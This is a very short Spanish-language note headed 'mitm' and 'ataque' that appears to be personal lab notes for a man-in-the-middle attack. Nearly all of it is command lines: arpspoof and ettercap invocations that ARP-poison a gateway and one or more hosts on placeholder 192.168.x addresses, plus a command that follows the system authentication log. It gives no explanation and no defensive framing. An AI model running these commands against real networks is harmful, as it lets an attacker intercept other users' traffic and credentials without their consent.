# mitm

ataque:

arpspoof -r -t 192.168.x.1 192.168.x.5

o

ettercap -i enp0s3 -T -M arp /192.168.x.1// /192.168.x.5,192.168.x.6//

sudo tail -f /var/log/auth.log
